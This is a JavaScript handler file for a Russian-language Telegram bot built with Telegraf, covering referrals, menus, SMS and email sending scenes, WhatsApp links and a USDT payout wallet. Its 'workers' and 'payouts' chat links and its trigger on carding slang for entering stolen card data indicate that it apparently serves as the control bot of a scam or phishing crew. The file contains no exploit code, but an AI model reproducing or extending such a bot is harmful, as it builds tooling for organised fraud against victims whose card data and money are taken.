const { Composer, Markup } = require("telegraf");
const menu = require("../commands/menu");
const { User } = require("../database");
const writers = require("../commands/writers");
const log = require("../helpers/log");
const instruments = require("../commands/instruments");
const referral = require("../commands/referral");
const information = require("../commands/information");
const locale = require("../locale");

const main = new Composer();

main.start(async (ctx) => {
  if (ctx.startPayload && ctx.startPayload != ctx.from?.id) {
    const user = await User.findByPk(ctx.from.id);
    const userFromReferralLink = await User.findByPk(ctx.startPayload);
    if (!userFromReferralLink || !user || user.referral) {
      return ctx.chat.id == ctx.from.id && menu(ctx);
    }

    await user.update({
      referral: ctx.startPayload,
    });
    await ctx.telegram
      .sendMessage(
        ctx.startPayload,
        `🎉 <b>У вас новый реферал:</b> <b><a href="tg://user?id=${ctx.from.id}">${ctx.state.user.username}</a>!</b>`,
        {
          parse_mode: "HTML",
        }
      )
      .catch((err) => err);
    await log(
      ctx,
      `стал рефералом для <b><a href="tg://user?id=${userFromReferralLink.id}">${userFromReferralLink.username}</a></b> <code>(ID: ${userFromReferralLink.id})</code>`
    );
  }
  return ctx.chat.id == ctx.from.id && menu(ctx);
});

main.hears(locale.mainMenu.buttons.main_menu, menu);

main.hears(locale.mainMenu.buttons.send_sms, (ctx) => ctx.scene.enter("send_sms"));

main.hears(locale.mainMenu.buttons.instruments, instruments);

main.hears(locale.mainMenu.buttons.writer, (ctx) => writers(ctx));

main.hears(locale.mainMenu.buttons.chats, (ctx) => {
  var all_btn = [[], []];
  if (ctx.state.bot.allGroupLink) all_btn[0].push(Markup.urlButton("👥 Воркеры", ctx.state.bot.allGroupLink));
  if (ctx.state.bot.payoutsChannelLink) all_btn[0].push(Markup.urlButton("💸 Выплаты", ctx.state.bot.payoutsChannelLink));
  if (all_btn.length < 1) all_btn = [Markup.callbackButton("Список пуст", "none")];
  all_btn[1].push(Markup.callbackButton(locale.go_back, "information"));
  ctx
    .replyOrEdit("💬 <b>Список чатов:</b>", {
      reply_markup: Markup.inlineKeyboard(all_btn),
      parse_mode: "HTML",
    })
    .catch((err) => console.log(err));
});

main.hears(locale.mainMenu.buttons.information, information);

main.hears(/^кто вбивает|на вбиве|вбивер|вбивает|вбейте$/giu, (ctx) => writers(ctx, false));

main.command("wa", (ctx) => {
  if (ctx?.message?.text.split(" ")[1]) {
    let number = ctx.message.text.split(" ")[1];
    if (number[0] == "+") {
      number = number.slice(1);
    }
    ctx.reply(`<b>https://wa.me/${number}</b>`, {
      parse_mode: "HTML",
      disable_web_page_preview: true,
    });
  } else {
    ctx.scene.enter("whatsapp_link");
  }
});

main.action("start", menu);

main.action("send_sms", (ctx) => ctx.scene.enter("send_sms"));

main.action("send_email", (ctx) => ctx.scene.enter("send_email"));

main.action("instruments", (ctx) => instruments(ctx));

main.action(/^settings_nickname_(show|hide)$/, async (ctx) => {
  try {
    await ctx.state.user.update({
      hideNick: ctx.match[1] == "hide",
    });

    await ctx
      .answerCbQuery("✅ Теперь ваш никнейм будет " + (ctx.state.user.hideNick ? "скрываться" : "показываться"), true)
      .catch((err) => err);

    return instruments(ctx);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
});

main.action("change_usdt_wallet", (ctx) => ctx.scene.enter("change_usdt_wallet"));

main.action("complaint", (ctx) => ctx.scene.enter("complaint"));

main.action("writers", (ctx) => writers(ctx));

main.action("information", (ctx) => information(ctx));

main.action("chats", (ctx) => {
  if (ctx.updateType == "callback_query") ctx.answerCbQuery().catch((err) => err);
  var all_btn = [[], []];
  if (ctx.state.bot.allGroupLink) all_btn[0].push(Markup.urlButton("👥 Воркеры", ctx.state.bot.allGroupLink));
  if (ctx.state.bot.payoutsChannelLink) all_btn[0].push(Markup.urlButton("💸 Выплаты", ctx.state.bot.payoutsChannelLink));
  if (all_btn.length < 1) all_btn = [Markup.callbackButton("Список пуст", "none")];
  all_btn[1].push(Markup.callbackButton(locale.go_back, "information"));
  ctx
    .replyOrEdit("💬 <b>Список чатов:</b>", {
      reply_markup: Markup.inlineKeyboard(all_btn),
      parse_mode: "HTML",
    })
    .catch((err) => console.log(err));
});

main.action("referral", referral);

main.action("whatsapp", (ctx) => ctx.scene.enter("whatsapp_link"));

module.exports = main;
